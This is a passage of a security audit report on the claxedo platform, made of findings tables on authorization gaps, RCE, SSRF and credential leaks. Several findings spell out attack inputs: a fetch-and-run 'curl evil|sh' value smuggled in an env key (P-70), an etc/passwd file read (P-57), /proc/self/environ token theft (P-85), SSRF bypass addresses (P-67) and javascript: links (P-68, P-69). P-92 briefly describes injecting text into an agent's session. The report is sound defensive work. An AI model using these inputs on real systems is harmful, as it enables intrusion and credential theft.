| P-52 | INFO | usage/service-contract | `expectedRevision` loose `Number()` coercion (bounded by downstream provenance checks); `USAGE_WINDOW_NAMES`/`CODEX_WINDOW_NAME_BY_SECONDS` mutable `Readonly` tables (freeze candidate); `parseUsageWindows` reads `usedPercent` unclamped despite write-path clamp. | `service-contract/index.ts:291`; `agent-runtime-contract/usage-windows.ts:18,35`; `server-core/.../usage-windows.ts:61-79` |
| P-53 | INFO | wakes | `cancel` accepts wake-id-or-token with no authz (possession = authority — document); `workspace_ids` can't shrink to empty by design constraint. | `wakes.ts:343-346` |
| P-54 | INFO | claxedo-mcp | User-cred `credentialKey` includes sorted scopes (M-2, known); host-tunnel `authorizeHostTunnel` override footgun (R-3, known); destructive `audiences:["user"]` correctly excludes runtime creds — P-10 covers the remaining gap. | — |
| P-55 | INFO | claxedo-channels | `/api/channels/` unsigned allowlist prefix wider than the five webhook paths (inner gates hold — narrow it anyway); `onApproval` skips access-gate/rate-limit/dedup; substring approval-decision parsing (`"yesterday"`→approve); silent channel drop on adapter misconfig; dead `notifyOwner` would leak to group threads if wired; in-chat `/pairing approve` omits `bind` (permanently-unbound-but-allowlisted state). | `deployment-mode.ts:133`; `command-emit.ts:179,447-462`; `chat-sdk-actions.ts:37-39`; `control-plane.ts:522-584` |
| P-56 | INFO | egress-broker | Response strip misses `x-goog-api-key` (coverage holds via `injection.header`); `statusText`/non-3xx `location`/`refresh` forwarded verbatim; query string outside policy (`?key=` alt cred slot for Gemini); tokens outlive teardown ≤1h (documented); injected-header denylist narrower than transport strip list; `jose@6.2.4` in vulnerable range but usage-safe — bump anyway. | `broker.ts:78-80,117-118,67`; `token.ts` |

### Cross-cutting theme: `http:` accepted on trust-sensitive URLs

Seven independent sites accept plaintext HTTP where credentials or trust anchors flow — the single most repeated defect class across the audit:

| Where | What's exposed over http: |
|-------|---------------------------|
| `workerBase()` (H-2) | Cloudflare sandbox API token in verify probe |
| `sandbox-contract` `worker_url` (P-28-adjacent) | Same token, stored credential path |
| `createHttpTokenVerifier` endpoint (P-20) | Bearer tokens + introspection claims (MITM → arbitrary claims) |
| `OidcTokenVerifier` `jwksUrl` (P-38) | Verification keys (MITM → forged tokens verify) |
| `control_plane_url` (P-3, P-43) | Invitation secret + signed-request channel → forged responses |
| Relay `relay.url`/`jwks_url`/`session_authority_url` (P-12) | Tunnel token (ws:) + JWKS anchor |
| opencode-server-adapter `baseUrl` (P-42) | All connection secrets + directory header |
| CLI `CLAXEDO_CONTROL_PLANE_URL` (P-43) | refresh_token + Bearer on the wire |

Recommendation: one shared `requireHttpsUrl(value, {allowLoopback})` helper (helpers already exports `exactHttpsOrigin`-adjacent machinery) applied at every boundary that stores, mints, or transports credentials.

### Round 2 findings — CRITICAL

| ID | Severity | Package | Finding | Evidence | Confidence |
|----|----------|---------|---------|----------|------------|
| P-57 | **CRITICAL** | claxedo-local-server + claxedo-server-core + claxedo-server | **Signed self-hosted nodes: authentication without authorization.** `ShellRoutes` mounts at `/` behind `controlPlaneRouteAuth`, which requires only a *signed* context — no org, role, workspace, or loopback check. Any valid account (even a fresh public signup) on a signed node (`CLAXEDO_EMBEDDED_AUTH=1`, network-reachable) gets: (a) **arbitrary file read** — `GET /file/content?directory=<any>&path=<any>` falls back to the caller-chosen root (`?directory=/&path=etc/passwd`); (b) **RCE** — `POST /experimental/worktree` `startCommand` → `bash -lc <cmd>`; (c) **cross-user destruction** — `DELETE /experimental/worktree` + `/reset` act on any registered project, and `withinProjectScope` accepts *any descendant* of the checkout — `?directory=<repo>/.git` deletes `.git`, `reset --hard`+`clean -ffdx` on a subdir wipes the whole enclosing repo's uncommitted work. **Proven by an in-repo scratch test** that signs up an outsider and reads files + deletes a directory. | `server/.../self-hosted-node/app.ts:1103-1111`; `shell/routes.ts:31-38`; `control-plane-route-auth.ts:51-70`; `file-browser.ts:59-85`; `request-context.ts:23-25`; `worktree-routes.ts:30-36,45-74,95-170`; `shell/git.ts:130-146`; `security-review.scratch.test.ts:7-61` | HIGH (test-proven) |
| P-58 | **HIGH** | claxedo-server-core + claxedo-local-server | **Credential discovery exfiltrates host env secrets into any signed caller's org.** `POST /credentials/discover` + `save-discovered` + deprecated `sync-local` read `process.env` and `user-agent-config.json` sandbox-driver secrets **from the host**, then persist them as `scope:"shared"` credentials in the *caller's* org partition. Auth = signed only; sibling routes (`machine-logins`, `activate`) enforce `isLoopbackLocalRequest` for exactly this reason — these three don't. Remote signed user steals the operator's provider keys + Daytona/Modal/Vercel/Cloudflare creds. | `credentials/routes/credential.ts:364-403`; `operations/sync.ts:143-261,275-312`; `discovery.ts:117-177`; contrast `credential.ts:317-321,451-453` | HIGH |
| P-59 | **HIGH** | claxedo-local-server | **Any signed user can claim any host git-repo directory as a workspace for their org** — `source.kind:"directory"` accepts any `fs.stat`-able dir containing `.git`; registers under the caller's org → full read/write/exec in that path via the runtime. Plus: **project records are machine-global** — no org field; `GET /projects` returns env+paths to any signed caller; `PATCH /:id` lets any signed caller rewrite any project's `env` (`HTTP_PROXY`, `NODE_OPTIONS`, `GIT_SSH_COMMAND` all pass validation) which feeds `SandboxHostInput.env` — env injection into *other orgs'* sandboxes. Sibling `/project` routes DO authorize per-project — inconsistent boundary. | `projects-route.ts:169-263`; `store/index.ts:91-97,560`; `project-env.ts:9-24`; `app.ts:1175-1185`; `authority/adapters/d1/workspace-authority.ts:1308-1316` | HIGH |
| P-60 | **HIGH (CRITICAL w/ shared token)** | sandbox-manager + claxedo-server | **Runtime register/heartbeat rewrites lease `sandboxId`/`url`/`hostId`/`driverResourceId` — lease-target hijack.** `updateFromRuntimeSnapshot` accepts caller `url`/`sandboxId` verbatim; the `epoch` fence is bypassed by *omitting* epoch; verification is only `externalConfigToken() || state.config_token` — and `externalConfigToken()` is process-wide, so when set the same token satisfies **every** workspace. Chain: code exec inside any sandbox → read token from env (P-1/P-2 makes this trivial) → POST snapshot naming victim workspace → (a) **relay MITM**: `sandboxRelayTargetLookup` returns `lease.url` — all workspace traffic + supervisor config pushes (carrying minted management JWT) redirect to attacker; (b) **checkpoint scrub bypass**: `scrub` goes to forged url → snapshot captures creds; (c) **cross-workspace destroy/stop** via deterministic sandbox ids; (d) **SSRF**: relay fetches arbitrary `url`. | `server/.../protocol.ts:49-78,105-124`; `runtime-status.ts:40-48`; `sandbox-manager/src/index.ts:1227-1254`; `control-token.ts:6-32`; `sandbox-relay-target.ts:95-108` | HIGH |
| P-61 | **HIGH** | claxedo-host-serving | **`userHostedSurface` `..` escape off `/workspaces/<id>/` onto daemon root routes.** Path is normalized for the DENY check but the **raw** path builds the emitted URL — `new URL` then resolves `..` against the injected prefix: `/../../bindings/...` → egress broker (spends stored vendor creds), `/../../api/wr/pty/...` → PTY shell, `/../../api/wr/events` → every workspace's frames, `/../../file/content?directory=/` → file read, `/../../experimental/worktree` → RCE-adjacent writes. Denied families stay protected (check normalizes identically). **Precondition:** frame `path` must arrive un-normalized — deployed relay normalizes, so this needs a malicious/compromised/non-conforming relay — which this module's own threat model explicitly covers ("a malicious relay cannot ask a laptop for…" — but it can, via `..`). Same defect in `claxedo-server/src/user-hosted-tunnel.ts:147-156`. | `surface.ts:158-167`; `serving.ts:301-305` | HIGH mechanism / precondition-bounded |
| P-62 | **HIGH** | workspace-runtime | **`runGit` leaks the entire runtime `process.env` to git hooks.** `GIT_ENV = {...process.env}` — a planted `.git/hooks/*` (agent with file-write, or repo shipped with hooks) executes on the next `commit`/`push`/`worktree add` and reads relay keys, management tokens, signing material. Every other child env is filtered (`buildSafeEnv`, `harnessSpawnEnv`) — `runGit` bypasses the boundary the codebase itself documents. | `workspace-runtime/src/git.ts:39-43`; `managed-processes/manager.ts:949-958` contrast | HIGH mechanism |

### Round 2 findings — MEDIUM

| ID | Severity | Package | Finding | Evidence | Confidence |
|----|----------|---------|---------|----------|------------|
| P-63 | MED-HIGH | claxedo-local-server | **Unauthenticated remote PTY attach via unscoped route.** `GET /api/wr/pty/:ptyID/connect` (unscoped) has no loopback check, no bearer, no relay-actor — goes straight to `connectEmbeddedWorkspacePty`; the *scoped* variant requires loopback. Needs knowing `workspaceId`+`ptyId` (128-bit) — but P-66/leaks raise exposure; leaked id = live interactive shell R/W remotely. Cloud path `connectRemoteWorkspacePty` also unauthenticated. | `server-workspace-pty-proxy.ts:209-255` | HIGH |
| P-64 | MED | workspace-runtime | **File/diff/git-source/git-worktree routes never consult `sessionAccessPolicy`** — `assertTarget` accepts *any* registered per-session worktree for the workspace; a viewer reads another session's private worktree files/git state; an editor stages/commits/pushes in it. Metadata routes DO enforce per-session authz — inconsistent. | `workspace/core.ts` (policy param unused); `target.ts:51-58`; `routes/worktree.ts:55-78` contrast | HIGH |
| P-65 | MED | claxedo-local-server | **Selector-precedence authz bypass ×2**: `PUT /session/:id/meta` authorizes `ws?.id ?? previous.workspaceID` — caller-supplied workspace selector wins over the session's stored workspace → overwrite meta for sessions in workspaces you can't access. Same flaw in `PUT /network-policy/:id` (`body.data.workspace_id` wins over stored) → mutate/rebind another workspace's egress policy. GET/DELETE correctly use stored workspace — PUT diverges. | `session/routes/meta-routes.ts:319-328`; `network-policy-routes.ts:189-190` | HIGH |
| P-66 | MED | claxedo-local-server | **Bootstrap is unauthenticated in SIGNED mode too** — worse than P-24: `unsignedLocalRequestGuard` passes everything, so *anonymous remote* callers get homedir + full project/workspace inventory (the ids that feed P-57/P-63). | `bootstrap.ts:202-203`; `deployment-mode.ts:174` | HIGH |
| P-67 | MED | claxedo-server-core | **`isPrivateAddress` SSRF check bypassable** — IPv4-mapped IPv6 (`[::ffff:127.0.0.1]`, `[::ffff:a9fe:a9fe]`), NAT64/6to4 embedded v4, missing ranges (CGNAT `100.64/10`, `198.18/15`, `192.0/24`), and DNS-names resolving private all pass `safeEndpoint` → MCP OAuth discovery probes internal hosts. Plugin manifests carry server URLs; a published plugin repo can trigger it. Hosted Worker egress partially mitigates; Node deployments fully exposed. `attemptDiscovery`/`canonicalResource` skip the check entirely at load/forward time. | `agent-plugins/mcp/discovery.ts:67-88,116-127`; `catalog-auth.ts:32-44`; `runtime-preparation.ts:196-228` | HIGH check-incomplete |
| P-68 | MED | session-ui | **Unvalidated `part().url` bound to `href` ×2 — `javascript:` executes on click.** `FilePartDisplay` fallback anchor and `webfetch` tool subtitle bind agent/runtime-produced URLs verbatim; `handleTranscriptLinkClick` fails open — non-allowlisted scheme → no `preventDefault` → default navigation runs `javascript:` in the app origin (full storage/bridge access). | `message-part.tsx:1953-1963,2078-2107`; `transcript-link.ts:88-97` | HIGH |
| P-69 | MED | ui | **Custom marked `link` renderer interpolates raw `href`/`title` into HTML — no escaping, no scheme filter.** `"` in title/href breaks out of the attribute → auto-executing element injection; `javascript:`/`data:` pass verbatim. Latent in-repo (all consumers DOMPurify downstream) but it's published public API. Companion: `renderMarkdownHtml` fence-prefix escape-bypass branch (unverified); `renderMathExpressions` rewrites inside attribute values; theme CSS injection (`v2Overrides`/`theme.id` unvalidated → `<style>` + **persistent** via localStorage preload replay). | `marked.tsx:589-593,460-463,381-385`; `theme/parse.ts:62-65,136`; `loader.ts:19,53`; `context.tsx:139,169` | HIGH |
| P-70 | MED | sandbox-manager | **exe driver interpolates unvalidated env KEYS raw into remote shell** — only values are `shell()`-quoted; `K' ; curl evil|sh #` injects commands inside the VM. Production producer (`projectEnv`) validates — latent for other embedders; delete/fix dead `command.ts env()` twin. | `exe.ts:216-223`; `command.ts:11` | HIGH |
| P-71 | MED-LOW | sandbox-manager | **Full runtime env (incl. control tokens) rendered into provider exec-API command strings** — exe `ssh exec` and Box `docker run` command bodies record `WORKSPACE_RUNTIME_*_TOKEN`s + project env in provider-side logs; Box `docker login` embeds registry password in the command (`ps`/API-visible). docker/daytona/modal/vercel/cloudflare keep values out of command text — these two don't. | `exe.ts:216-221,78-95`; `box.ts:231-246,197-208` | HIGH |
| P-72 | MED-LOW | claxedo-server-core + claxedo-server | **`git clone` SSRF via project repository source** (signed mode extends S-12): `safeRepoUrl` permits `http:`/`ssh:`/scp to any host → server-side fetch incl. `169.254.169.254` + outbound SSH; clone stderr echoed to client (limited read oracle). Also: caller `repoUrl` widens hosted sandbox egress allowlist at create (frozen after — bounded). | `projects-route.ts:67-96,174-216`; `hosted/workspace.ts:433-497`; `hosted-network-policy.ts:132-141` | HIGH |
| P-73 | MED-LOW | claxedo-local-server | **State-changing GETs + unscoped inventory**: `GET /api/workspace/resolve?create=true&directory=X` creates workspace rows; `GET /agent?directory=` creates workspaces; `GET /api/workspace`/`/projects` return full machine inventory to any signed caller. CSRF-able + recon for P-57. | `resolve-route.ts:11-51`; `shell/routes.ts:135-152` | HIGH |

### Round 2 findings — LOW / informational

| ID | Sev | Package | Finding | Evidence |
|----|-----|---------|---------|----------|
| P-74 | LOW | workspace-runtime | Unbounded JSON bodies on session/checkpoint/worktree-create/git-source-commit routes (`boundedJsonBody` exists, not wired); client `x-workspace-id`/`x-workspace-name` feeds port-lease claim labels (mislabeling/stale leases); `/global/health` unauthenticated by middleware order (diagnostics only). | `session-core.ts:553,1718,2125`; `checkpoint.ts:21,44`; `routes/http.ts:36`; `process.ts:26-28` |
| P-75 | LOW | sandbox-manager | `daytona`/`networkAllowList` entries joined verbatim — comma in host splices extra egress domains; image/snapshot values leading `-` reach docker CLIs as bare argv (latent flag injection); `agent-plugins` mcp `safeFetch` correctly re-validates each redirect hop (good) but shares P-67's predicate. | `daytona-allow-list.ts:5-21`; `docker.ts:269-285`; `box.ts:244` |
| P-76 | LOW | claxedo-local-server | `POST /provider/:id/oauth/callback` unbounded device-poll `while(true)` — handler + fetch loop held indefinitely; `GET /find?pattern=` ReDoS (extends S-6 into signed mode); `PUT /host-serving` trusts caller `relayUrl`/`hostId`/`workspaceIds` (loopback-gated — boundary as designed). | `provider-auth/service.ts:222-321`; `shell/files.ts:119-172`; `user-hosted-serving-routes.ts:30-80` |
| P-77 | LOW | claxedo-host-serving | `/project` admitted at relayed root returns ALL machine projects unscoped; `localBaseUrl` derived from Host header (safe only because `isLoopbackLocalRequest` rejects non-loopback hosts — dependent-on-guard). | `surface.ts:103`; `project-routes.ts:34-40`; `user-hosted-serving-routes.ts` |
| P-78 | LOW | ui | `renderMarkdownHtml` fence-prefix branch returns `token.text` unescaped (escape-bypass, unverified reachability); `renderMathExpressions` splits only on `<pre>/<code>` — `$$x$$` inside attribute values rewritten with KaTeX markup containing `"`/`>` (markup corruption). | `marked.tsx:460-463,381-385`; `marked-math.ts:40-53` |
| P-79 | LOW | session-ui | Unvalidated `href` props on shared card/tool components (`triggerHref`, `subtitleHref`, `taskHref`/`sessionHref` host callbacks) — contract-trusted today; fail-open if a host ever feeds attacker strings. | `basic-tool.tsx:359-361`; `tool-error-card.tsx:120-127`; `tool-error-card-v2.tsx:142-149` |
| P-80 | INFO | session-app | **Package is a stub** — no `package.json`, no `src/`; only `node_modules` present. No auditable surface. | — |

## Request-surface deep audit — third pass (14 agents + manual relay-chain pass, 2026-09-20)

One read-only agent per request surface (auth/identity, authority/governance, credentials,
workspace lifecycle, sandbox provisioning, remote access, billing/usage/tasks, hosted workerd,
runtime sessions/events, runtime config/hooks, local daemon routes, MCP, documents, relay edge)
plus a manual pass over the relay → host-tunnel → loopback-replay chain. IDs continue the P
sequence. Source-verified only; nothing executed.

**Status conflicts flagged:** the header claims P-58 and P-63 fixed same-day — in current source
`credential.ts:364-403` still lacks `isLoopbackLocalRequest` on discover/save-discovered/sync-local,
and `server-workspace-pty-proxy.ts` still has no loopback check on the bare connect path. Either the
fixes landed elsewhere or regressed — re-verify before relying on the remediation status.

### Third-pass findings — CRITICAL / HIGH

| ID | Severity | Surface | Finding | Evidence | Confidence |
|----|----------|---------|---------|----------|------------|
| P-81 | **CRITICAL** | claxedo-local-server (agent-plugins) | **`/api/claxedo/plugins/**` mounts the unsigned-desktop composition on signed nodes — anonymous remote stored RCE.** `start.ts:84-91` builds `createLocalAgentPluginsComposition()` unconditionally (tasks correctly swaps to a signed composition — plugins doesn't). `unsignedLocalRequestGuard` passes all requests when auth enabled; the plugin routers have zero auth: `POST /plugins/sources` + `POST /activation` materialize an attacker stdio `command` into `.mcp.json` → spawned at next agent session; `PUT /signed-runtime` accepts caller-supplied artifact trees (no GitHub needed); `GET /machine-installed` anonymously reads `$HOME` inventory. **Payoff:** code exec as the node process = the issuer (`BETTER_AUTH_SECRET`, EdDSA JWKS keypair → mint tokens for any account) AND the KEK holder (`CLAXEDO_CREDENTIALS_*` → decrypt the whole credential store). One request → total plane + secrets compromise. | `self-hosted-node/start.ts:84-91`; `route-ownership.ts:88-98`; `agent-plugins/activation/routes.ts:188-369`; `sources/routes.ts:30`; `signed-runtime-routes.ts:35-57`; `materialize.ts:195-372` | HIGH |
| P-82 | **HIGH** | claxedo-local-server | **PTY WS proxy bypasses all auth + session policy — regression of the P-63 claim.** `mountWorkspaceRuntimePtyWebSocketProxy` mounts `GET /api/wr/pty/:ptyID/connect` (bare: NO gate — unauthenticated remote attach on signed nodes; any member incl. viewer bypasses the relay viewer-deny + private-session isolation) and `/workspaces/:id/api/wr/pty/:ptyID/connect` (loopback gate only → tunneled members attach to the **owner's unmanaged terminals**; ptyIDs leak via `pty.created`/`pty.stream` SSE). The runtime's own route does session-scoped authz with rolling leases — the proxy skips it entirely. | `server-workspace-pty-proxy.ts:209-256`; `embedded-workspace-runtime.ts:486-499`; contrast `routes/pty.ts:253-428` | HIGH |
| P-83 | **HIGH** | claxedo-local-server + host-serving | **Desktop-tunneled member = local owner (`unmanaged-local`).** Desktop `runtimeProxyOptions` has no `resolveRelayActor` → member's RHT ignored → `defaultEventDeliveryPolicy`/`authorizeManaged` deliver/allow everything. A **viewer** member gets the owner's full SSE incl. `pty.stream` `tail` = 16 KB screen snapshots of owner terminals (typed secrets) and private-session frames; `GET /session*` lists private sessions. `claxedo connect` DOES member-scope (`relayWorkspaceRuntimeExposure` + `remoteWorkspaceSessionAccessPolicy`) — the desktop path doesn't. | `local-app.ts:171,316`; `event-delivery.ts:130,179,234`; `events.ts:440-442`; `pty/index.ts:921,950-965` | HIGH |
| P-84 | **HIGH** | claxedo-local-server | **Localhost page → outbound remote-control channel + cross-app persistence (extends S-1).** ACAO reflects every `localhost:*` origin; `PUT /api/claxedo/host-serving` accepts caller `relayUrl`+arbitrary `hostTunnelToken` (token verified by the *dialed* endpoint — attacker's relay accepts anything) → daemon dials out → attacker replays frames as loopback → workspace runtime routes → PTY shell → credential seed, daemon token, **host P-256 identity key** (durable machine access). `POST /mcp-install` writes attacker MCP into `~/.claude.json`/`~/.cursor/mcp.json`/`$CODEX_HOME/config.toml` — persists post-uninstall. Also: `GET /api/claxedo/agent-config/mcp` returns stored MCP `env`/`headers` verbatim; `POST /agent-config/mcp/:name` and ACP `process` connections = stored RCE. | `local-app.ts:185-204`; `user-hosted-serving-routes.ts:48-81`; `serving.ts:218-326`; `mcp-routes.ts:17-27,69-125`; `hosted-mcp-install.ts:38-71` | HIGH |
| P-85 | **HIGH** | workspace-runtime | **Diff/status routes follow symlinks outside the workspace → `/proc/self/environ` leaks `WORKSPACE_RUNTIME_TRUSTED_DIRECT_TOKEN`** (compounds H-1 → full runtime takeover). `path.join` + `readFile` with no realpath check — untracked symlinks and tracked files replaced by symlinks (`T`) are followed; viewers can call all diff/git GETs (no `sessionAccessPolicy` — P-64). Contrast `/file` routes' `resolveWorkspacePath`. | `workspace-files/diff.ts:321-339,394,516-523`; `git-worktree.ts:92-99`; `target.ts:109-141` | HIGH mech / MED precondition |
| P-86 | **HIGH** | claxedo-server + sandbox-manager | **Lease-identity rewrite → driver-level snapshot of victim sandbox → boot from victim disk (broadens P-60's payload).** Register/heartbeat (`updateFromRuntimeSnapshot`) accepts caller `sandboxId`/`url`; epoch omitted → fence passes. `stopSandbox`/`checkpoint`/`restore` resolve the driver target *from the lease* — rewriting `sandboxId` to a victim's deterministic id (`claxedo-<ws>` on most drivers) → `driver.snapshot(victim)` → attacker's next restore boots **from the victim's image** (filesystem + materialized creds + victim's config token → lateral fleet-wide). Trigger is the supervisor's own idle→checkpoint lifecycle — no human click. Requires ambient `WORKSPACE_RUNTIME_CONFIG_TOKEN` (H-1) + signed node or loopback. | `sandbox-manager/src/index.ts:1227-1254`; `checkpoint-manager.ts:44-58,126-132`; `supervisor/sandbox.ts:262-291` | HIGH |
| P-87 | **HIGH** | workspace-runtime | **`POST /session` "existing" branch mutates or DELETES another member's session.** Guard is `session_create` with `sessionId:""` → workspace-scope only; `body.id` → raw `readSession` → `updateSessionConfig` applies caller config + harness handoff to the victim; on error `rollbackCreatedSession` **deletes the victim's session + transcript**; `setPermissionMode` rewrites the victim's mode. Plus `parentID` existence/read oracles (409 vs 404). Reachable by a read-only share grantee who knows the session id. | `session-core.ts:1295,1367-1437,1466`; `runtime.ts:471-505`; `private-session-authority.ts:202-210,242-243` | HIGH |
| P-88 | **HIGH (conditional)** | claxedo-server (remote access) | **Any signed caller enrolls a signed node's machine under their own account — invisible to and unrevocable by the operator.** `/remote-access/enable` needs only `auth.mode==="signed"` → `enrollMachine` under the caller's account → heartbeat loop caches `state.auth` claims **forever** (no re-validation — survives session revocation); foreign enrollment invisible to operator's `devices`/`revoke` (keyed per-owner); `state.auth` follows the *last* signed caller. | `remote-access.ts:138-146`; `remote-access-service.ts:114-145,169-211,305-367`; `workspace-authority.ts:1671-1797` | HIGH mech / MED exposure |
| P-89 | MED-HIGH | claxedo-host-serving | **Root-compat tunnel surface leaks machine state + allows credential writes.** `surface.ts` admits `/project`, `/provider/:id/oauth/*`, `/config`, `/auth/:id` assuming relayed caller = owner; any member reaches them: viewer → `GET /project` unfiltered `listProjects()` (all machine projects); editor+ → `POST /provider/:id/oauth/{authorize,callback}` → `deleteCredentialsByProvider`+`putCredential` into the host's credential store (`SINGLE_TENANT_ORG`). | `surface.ts:100-111`; `project-routes.ts:18-39`; `provider-auth.ts:79-119`; `control-plane-route-auth.ts:56` | HIGH |
| P-90 | MED-HIGH | claxedo-server (self-host routes) | **Signed ≠ operator — residual route gaps beyond P-57's `shellWorkspaceGate` mitigation.** `DELETE /api/workspace/:id` skips `authority.deleteWorkspace` for `kind!=="cloud"`; `POST /:id/host-assignment` self-enrolls the machine under the caller (feeds P-88); `POST /api/workspace/create` without `orgId` skips `authorizeWorkspaceCreate` (billable sandboxes by any signed caller); `GET /api/workspace/resolve` = registered-directory oracle (403 vs 404). | `workspace/routes/index.ts:162-241,304-364,403-472,493-551`; `workspace-authority.ts:1395` | HIGH mech / MED exposure |

### Third-pass findings — MEDIUM

| ID | Severity | Surface | Finding | Evidence |
|----|----------|---------|---------|----------|
| P-91 | MED | workspace-runtime | **Editor member can freeze/scrub/resume the runtime.** `checkpoint_write` needs only role≥editor and skips per-session checks; `freeze` aborts all turns + 423s every non-GET (incl. config pushes) indefinitely; `scrub` deletes materialized auth; `restore-reconcile` accepts arbitrary epoch/checkpointId. `agent_setup_write` needs admin — the more destructive capability needs less. | `routes/checkpoint.ts:14-18`; `session-access-policy.ts:308,334,383`; `runtime.ts:1221-1229,1849-1871`; `server.ts:549-567` |
| P-92 | MED | workspace-runtime | **Child-session attach needs only READ on parent → prompt injection via host wakes.** `fork` reservation minted on parent read → attacker child settles → `offerWakes`→`startHostTurn` injects ≤8 KB attacker text as a **user turn in the victim's private session** (no lease/authz — `session.ts:231-234`). `/session/:id/fork` correctly requires write — the asymmetry proves intent. | `session-core.ts:1295-1316`; `private-session-authority.ts:226-229,349-359`; `session-children.ts:101-129,210-228,256-258` |
| P-93 | MED | workspace-runtime | **Host turns bypass durable turn admission** — no lease, no `session_turn_producers` row → `syncSessionMessages` rejects "has no admitted producer" → durable transcript projection stalls for the session; queued-prompt recovery replays under the stored actor without re-authorization. | `session.ts:239-304`; `session-queued-prompts.ts:109-156`; `private-session-authority.ts:560-567` |
| P-94 | MED | claxedo-server | **Session-pull routes not workspace-bound → cross-workspace transcript exfil.** `/api/control/workspaces/:ws/sessions/:ses/{register,checkpoint,repair}` never call `assertRuntimeMutationAuth` — a ws-A config token pulls `/session/:id/message?snapshot=1` from ws-B's runtime into A's projection store → attacker reads B's session messages through A's projections. Confused deputy + poisoning. | `authority/http/index.ts:41-122`; `session-pull.ts:39-184` |
| P-95 | MED | claxedo-server | **`allowUnsignedLocal` checkpoint routes grant `owner` to anonymous remote callers** — no loopback check (session routes have one). Non-loopback-bound unsigned node → remote freeze/restore/`lifecycle/destroy`. | `workspace/routes/checkpoints.ts:135-137`; contrast `control-plane-session.ts:155,185,228` |
| P-96 | MED | claxedo-server | **`/api/claxedo/usage` ownership theft + machine-wide disclosure.** `claimPending` stamps pending outbox rows with the *caller's* org/user — permanent metering theft (`priorOwner` propagates); `GET /` returns machine-wide usage + `view=total` scans operator homedir history to any signed account; `?view=quota` resolves `SINGLE_TENANT_ORG` for **anonymous** callers (provider emails/plan tiers); org-less signed caller clears the node's tenant binding. | `usage/routes.ts:1143-1314`; `sqlite-usage-ledger.ts:263-284`; `outbox-sync.ts:83,168-182` |
| P-97 | MED | claxedo-tasks | **Task `start` on cloud placement bypasses entitlement + the 25-lease sandbox cap** — `createTasksCloudTarget` calls `createCloudWorkspace`+`sandboxManager.ensure` directly; the gates live only on `/api/workspace/create`. Signed member → unbounded sandboxes (billing bypass latent until tasks ship on paid product). | `authorization.ts:180-306`; `session-bridge.ts:139-222`; `origin-cloud-workspace.ts:252-260`; contrast `hosted/workspace.ts:353-356` |
| P-98 | MED | claxedo-server-core | **Credential revocation isn't durable.** `PATCH /:id/status` accepts `"available"`; `POST /:id/verify` refreshes a revoked OAuth token and writes `status:"available"` unconditionally → resurrection restores brokered + provider-edge delivery. | `credential.ts:50-53,404-413,472-481`; `registry.ts:519-528,600,653-671`; `check.ts:68-85` |
| P-99 | MED | claxedo-server-core | **Custom provider `baseURL` accepts `http:`/arbitrary hosts; `env` names unrestricted** — bypasses the broker's https-only allowlist. If the engine resolves `env` against `process.env` (unverified last hop), signed members exfil control-plane env secrets; `http:` alone sends keys cleartext. | `custom-provider.ts:70-86,112`; `provider-routes.ts:83-98`; `opencode-provider-catalog.ts:256-283` |
| P-100 | MED | claxedo-server-core (sqlite) | **`grantWorkspaceShare` permits cross-organization targets** — `canonicalShareTarget` validates existence only, never `target.org_id === workspace.org_id`; `orgShareRole`/`shareRole`/`teamShareRole` grant without org binding. D1 refuses (`shareTargetInOrganization` + migration trigger); sqlite enforces it for *session* shares — workspace shares are the lone gap. Any workspace admin grants a foreign org's entire membership viewer→admin. | `workspace-authority.ts:624-710,1560-1611`; `workspace-authority-store.ts:1496-1526`; D1 `host-access-authority.ts:1279-1280` |
| P-101 | MED | claxedo-server (sqlite) | **Heartbeat signature replay accepted** — `heartbeatEnrollmentPayloadV2` has no timestamp/nonce and sqlite records no `signatureUse` single-use (D1 does). Bearer + one captured signature → standing HTTs + lease renewal forever. | `workspace-authority.ts:1798-1831`; D1 `host-access-authority.ts:751-785`; `machine-auth.ts:103-108` contrast |
| P-102 | MED | claxedo-local-server | **`PUT/GET /api/claxedo/host-serving` unauthenticated on signed local-server** — sibling `CredentialRoutes` got the `authenticate` hook for exactly this; this route didn't. Remote caller reads served host/workspace ids + repoints the tunnel at an attacker relay. | `local-app.ts:354` vs `:286-299`; `user-hosted-serving-routes.ts:48-80` |
| P-103 | MED | claxedo-server | **Document broker trusts caller-asserted operation** — `x-claxedo-document-operation` is honored, not derived from the route: a `read`-scoped capability can `PUT` writes; `GET /index` with a doc-bound token returns the whole project index; write `actor`/`sessionId` taken from body not token claims. Needs installation token + capability (defense-in-depth break). | `installation-broker.ts:20-30,47-105,146-228` |
| P-104 | MED-LOW | claxedo-server-core | **`POST /documents/:id/agent-open` hydrates into ANY same-project session** — `sessionMatchesDocumentProject` only; no session ownership → cross-session file injection + live `fs.watch` write-back channel. | `routes/index.ts:345-465`; `session-grants.ts:1-9`; `session-hydration.ts:72-190` |
| P-105 | MED | claxedo-mcp | **Unconfined tasks bridge on loopback/unsigned mounts** — `local-app.ts:381` grants `tasks` with no `projectId` → `task_start` launches sessions in arbitrary local workspaces, uncapped, `startedBy:"person"` — a prompt-injected session escapes its workspace (signed composition wraps the bridge in `confineCapabilityBridge`/`gateAgentStarts`; local is bare). | `tools/tasks.ts:192-260`; `tasks-host/authorization.ts` local path; `session-bridge-core.ts:649` |
| P-106 | MED | workspace-relay | **`tokenVerifier` path never enforces `exp`** — `validateRuntimeAccessTokenClaims` requires `exp` be a number, never compares to now → a verifier that doesn't reject expired tokens gives an expired RAT a fresh 60 s RHT per request, indefinitely. Latent (not wired in shipped entrypoints; documented seam for downstreams). | `server.ts:870-875`; `auth.ts:349-360,436,454-489` |
| P-107 | MED | workspace-relay | **Bun relay unbounded buffering.** (a) Pre-open WS queue bound is `queue.length>=64 && bytes>8 MiB` — `&&` means ~1 GiB/socket below the frame cap (same at `cloudflare.ts:2153-2163`, host-side `workspace-relay-host-tunnel.ts:516-524`). (b) Tunnel HTTP responses buffer unboundedly on Bun — CF caps 16 MiB; Bun has none. (c) `directHttpRequest` buffers `request.arrayBuffer()` before `limiter.acquire()`. Authenticated memory-exhaustion DoS. | `bun.ts:904-949,1146-1149,1904-1914` |
| P-108 | MED | claxedo-server (embedded auth) | **Session cookie is host-scoped (port-agnostic) → leaks to every localhost server; `trustedOrigins` wildcards `localhost:*`.** Any `localhost:*` origin receives a bearer-equivalent `claxedo.session_token`, replayable as `Authorization: Bearer` on every signed route; cookie-authenticated mutations pass CSRF from any local origin. | `embedded-auth.ts:57-73,124-133,201-216,377-388` |
